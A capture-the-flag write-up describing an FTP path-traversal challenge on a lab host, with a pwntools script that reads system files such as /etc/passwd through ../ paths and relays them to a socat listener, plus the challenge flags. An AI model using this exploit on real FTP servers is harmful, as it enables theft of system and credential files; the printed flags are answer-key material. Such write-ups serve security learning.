# [Medium] Factory Reset (300 points)

> In the haunted factory, which once was a masterpiece before the AI took over, lies many secrets. Can you find them all to gain control over the havoc?
>
> Note: the target system is running on 10.6.0.100
>
> Author information: This challenge is developed by [Ankit@DeloitteNL](https://in.linkedin.com/in/ankit-parashar-205771160).

The challenge provides an OpenVPN configuration file which we can use to connect to the vulnerable system and an interface to launch backend systems.

During the CTF, I followed the below writeups/blogs.

https://hackerone.com/reports/694141

https://arinerron.com/blog/posts/6

### No Limits [150 points]

> We are bound to our limits, the AI wasn't. Can you go beyond the limit searching for the stolen data?

- Exploit FTP using the writeups above
- Setup tcp listener: `socat - TCP-LISTEN:9999,fork,reuseaddr`.
- Dump all important linux files using a wordlist and the script below. `list.txt` should contain the files that you'd like to get contents off, for example: `/etc/passwd` or `/proc/self/cwd`, etc.
- To retrive files, use `RETR` and to list directories use `MLST` or similar.

```py
from pwn import *
import os

r = remote('10.6.0.100', '21')

r.recv()

with open('list.txt') as file:
  files = [line.strip() for line in file.readlines()]

for i in files:
  r.sendline(b'PORT 10,6,0,10,1,1002')
  r.sendline(f'RETR ../../../../../../{i}'.encode())
  sleep(2)
  value = r.recv().decode()
  print(i)
  print(value)
  
  if 'connection opened' in value:
    sleep(2)
    io = remote('127.0.0.1', 1258)
    io.sendline(f'\n\n{i}\n\n'.encode())
    io.close()

r.interactive()
```

The first flag is present in `/etc/motd`.

**Flag:** `CTF{F0rtREss_Br3@c#3d}`

### Safe Zone [75 points]

> There are no roads. The only way you can walk is to break the wall..... and gain access.

Looking at the bash history, we can see figure out that the second flag is present in /var/backups/data/.

```bash
...
ls -la
uftpd -o ftp=21
cd /var
ls
cd backups
ls
ls -la
mkdir data
exit
...
```

**Flag:** `CTF{Th3_Inc3pt0r}`

### Master [75 points]

> Dig little deeper to take the control back from the AI. You will find out what you need only when you know who you are.

Unsolved.

Even though I took a careful look at all the dumped files, I couldn't find anything out of the ordinary. This challenge remains unsolved and I will have to take a look at writeups by other participants.
